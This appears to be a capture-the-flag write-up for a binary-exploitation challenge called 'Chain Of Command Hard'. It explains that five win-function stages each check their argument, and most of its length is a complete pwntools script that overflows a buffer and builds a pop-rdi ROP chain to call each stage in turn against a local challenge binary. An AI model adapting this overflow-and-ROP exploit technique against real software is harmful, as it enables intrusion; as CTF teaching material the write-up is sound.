![](img/Chain%20Of%20Command%20Hard-1780651709693.webp)
![](img/Chain%20Of%20Command%20Hard-1780651733139.webp)
![](img/Chain%20Of%20Command%20Hard-1780651775716.webp)

the binary contain many fragments of win function, each with a checker

our objective is clear: find a way to manipulate rdi in our ROP chain

![](img/Chain%20Of%20Command%20Hard-1780651841752.webp)

with ROPgadget, we can find a gadget which pop rdi for us

the structure of our payload is

```
pop1 + [1] + pop2 + [2] + pop3 + [3] + pop4 + [4] + pop5 + [5]
```

```
#!/usr/bin/python3
from pwn import *

context.log_level="debug"

script='''
b *challenge+35
b *win_stage_1
'''

context.binary = exe = ELF("../chain-of-command-hard")

# p=gdb.debug(exe.path, gdbscript=script)
# p.interactive()

p=process(exe.path)

pop=p64(0x0000000000402093)

payload=b"A"*0x58

zz=pop
zz+=b"\x01"
zz=zz.ljust(0x10,b"\x00")
zz+=p64(exe.sym.win_stage_1)
payload+=zz 

zz=pop
zz+=b"\x02"
zz=zz.ljust(0x10,b"\x00")
zz+=p64(exe.sym.win_stage_2)
payload+=zz 

zz=pop
zz+=b"\x03"
zz=zz.ljust(0x10,b"\x00")
zz+=p64(exe.sym.win_stage_3)
payload+=zz 

zz=pop
zz+=b"\x04"
zz=zz.ljust(0x10,b"\x00")
zz+=p64(exe.sym.win_stage_4)
payload+=zz

zz=pop
zz+=b"\x05"
zz=zz.ljust(0x10,b"\x00")
zz+=p64(exe.sym.win_stage_5)
payload+=zz

time.sleep(0.2)
p.send(payload)

p.interactive()

```